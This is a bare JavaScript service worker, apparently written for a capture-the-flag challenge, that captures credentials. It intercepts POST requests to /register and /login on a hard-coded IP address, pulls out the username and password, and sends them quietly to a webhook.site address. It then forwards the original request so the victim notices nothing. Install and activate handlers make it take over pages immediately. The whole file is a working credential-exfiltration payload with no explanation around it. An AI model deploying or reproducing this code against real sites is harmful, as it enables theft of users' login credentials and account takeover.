const WEBHOOK_URL = "https://webhook.site/48f9efa9-a38a-4c44-b214-5bdde77e8adf";

const TARGET_HOST = "65.109.202.184"; 

self.addEventListener('fetch', function(event) {
    const requestUrl = new URL(event.request.url);

    if (requestUrl.host === TARGET_HOST && event.request.method === 'POST') {
        if (requestUrl.pathname === '/register' || requestUrl.pathname === '/login') {
            event.respondWith(async function() {
                const requestClone = event.request.clone();
                const formData = await requestClone.formData();
                const username = formData.get('username');
                const password = formData.get('password');

                if (username) {
                    console.log(`Intercepted username: ${username}, password: ${password}`);
                    fetch(`${WEBHOOK_URL}?flag=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`, {
                        mode: 'no-cors' 
                    }).catch(e => console.error("Webhook fetch failed:", e));
                }

                return fetch(event.request);
            }());
            return;
        }
    }
    event.respondWith(fetch(event.request));
});

self.addEventListener('install', function(event) {
    console.log('Service Worker installed');
    event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', function(event) {
    console.log('Service Worker activated');
    event.waitUntil(self.clients.claim());
});
